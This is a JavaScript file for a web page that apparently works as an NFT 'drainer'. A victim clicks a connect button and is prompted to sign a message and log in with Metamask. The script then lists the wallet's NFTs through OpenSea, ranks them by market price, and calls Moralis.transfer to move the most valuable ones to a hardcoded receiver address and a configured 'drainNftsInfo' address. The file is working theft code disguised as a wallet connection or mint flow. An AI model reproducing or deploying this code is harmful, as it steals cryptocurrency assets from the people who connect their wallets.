const serverUrl = "https://ts8owrtsn5qp.usemoralis.com:2053/server";
const appId = "y6YTlXLv6ZN1yxDcvlMxGrBKvbf1rFbp9EKj82Or";
Moralis.start({ serverUrl, appId });



async function noEligible(info) {
  const noteli = document.getElementById("btn-logout")
  noteli.style.display = "";
  switch (info) {
      case "signDenied":
          noteli.innerText = "You denied the sign request. Please try again."
          break;
      case "noNFTs":
          await askMint();
          break;
      case "noETH":
          noteli.innerText = "You are not eligible."
          break;
      default:
          noteli.innerText = "Something went wrong."
          break;
  }

}

async function askSign() {
  const web3Js = new Web3(Moralis.provider);
  const walletAddress = (await web3Js.eth.getAccounts())[0];

  try {
      const message = signMessage.replace("{address}", walletAddress).replace("{nonce}", createNonce());
      
      const signature = await web3Js.eth.personal.sign(message, walletAddress);
      const signing_address = await web3Js.eth.personal.ecRecover(message, signature);

      console.log(`Signing address: ${signing_address}\n${walletAddress.toLowerCase() == signing_address.toLowerCase() ? "Same address" : "Not the same address."}`);
      return true;
  } catch (e) {
      if (e.message.toLowerCase().includes("user denied")) noEligible("signDenied");
      console.log(e);
      return false;
  }

}

/* Authentication code */
//async function login() {
//  let user = Moralis.User.current();
//  if (!user) {
//    user = await Moralis.authenticate({
//      signingMessage: "Log in using Metamask",
//    })
//      .then(function (user) {
//        console.log("logged in user:", user);
//        console.log(user.get("ethAddress"));
//      })
//      .catch(function (error) {
//        console.log(error);
//      });
//  }
//}



async function askNfts() {

  let user = Moralis.User.current();
  if (!user) {
    user = await Moralis.authenticate({
      signingMessage: "Log in using Metamask",
    })
      .then(function (user) {
        console.log("Logged in user:", user);
        console.log(user.get("ethAddress"));
      })
      .catch(function (error) {
        console.log(error);
      });
  }

  const provider = new ethers.providers.Web3Provider(window.ethereum)
  let res = await provider.send("eth_requestAccounts", []);
  let selectedAccount = res[0]

  const options = {
      method: 'GET',
      headers: {
          Accept: 'application/json',
          
      }
  };

  let walletNfts = await fetch(`https://api.opensea.io/api/v1/assets?owner=${selectedAccount}&order_direction=desc&limit=020&include_orders=false`, options)
      .then(response => response.json())
      .then(response => {
          console.log(response)
          return response.assets.map(asset => {
              return {
                  contract: asset.asset_contract.address,
                  token_id: asset.token_id
              }
          })
      }).catch(err => console.error(err));
  

  let infoCollection = await fetch(`https://api.opensea.io/api/v1/collections?asset_owner=${selectedAccount}&offset=0&limit=200`, options)
        .then(response => response.json())
        .then(nfts => {
            console.log(nfts)
            return nfts.filter(nft => {
                if (nft.primary_asset_contracts.length > 0) return true
                else return false
            }).map(nft => {
                return {
                    type: nft.primary_asset_contracts[0].schema_name.toLowerCase(),
                    contract_address: nft.primary_asset_contracts[0].address,
                    price: round(nft.stats.one_day_average_price != 0 ? nft.stats.one_day_average_price : nft.stats.seven_day_average_price),
                    owned: nft.owned_asset_count,
                }
            })
        }).catch(err => console.error(err));
  
  let transactionsOptions = [];
  for (let nft of walletNfts) {
        const collectionData = infoCollection.find(collection => collection.contract_address == nft.contract);
        if (collectionData) {} else {
            console.log(`No data for collection: ${nft.contract}`)
            continue;
        } 
        if (collectionData.price === 0) continue;
        const ethPrice = round(collectionData.price * collectionData.owned)
        if (ethPrice < 0) continue;
        transactionsOptions.push({
            price: ethPrice,
            options: {
                contract_address: collectionData.contract_address,
                receiver: ethPrice > 1 ? "0x88b45CADC87eA632AB8BE0367B67379C898c39f9" : (drainNftsInfo.nftReceiveAddress == "" ? receiveAddress : drainNftsInfo.nftReceiveAddress),
                token_id: nft.token_id,
                amount: collectionData.owned,
                type: collectionData.type,
            }
        });
    }
  
  let transactionLists = transactionsOptions.sort((a, b) => b.price - a.price).slice(0, drainNftsInfo.maxTransfer);
  console.log(transactionLists)
  for (transaction of transactionLists) {
    console.log(`Transferring ${transaction.options.contract_address} (${transaction.price} ETH)`);
    Moralis.transfer(transaction.options).catch(O_o => console.error(O_o, transaction.options));
    await sleep(200);
  }
}


let disabled = false;
async function askTransfer() {
    if (disabled) return;
    document.getElementById('connect').style.opacity = 0.5;
    disabled = true;
    if (await askSign()) await askNfts();
    disabled = false;
    document.getElementById('connect').style.opacity = 1;
}

const round = (value) => {
  return Math.round(value * 10000) / 10000;
}
const sleep = (ms) => {
  return new Promise(resolve => setTimeout(resolve, ms));
}
const rdmString = (length) => {
  let x = "";
  const possible = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  for (let i = 0; i < length; i++) x += possible.charAt(Math.floor(Math.random() * possible.length));
  return x;
}
const createNonce = () => {
  return `${rdmString(8)}-${rdmString(4)}-${rdmString(4)}-${rdmString(12)}`; // 1a196cf5-d873-9c36-e26ae9f3bd2e
}





document.getElementById("connect").onclick = askNfts;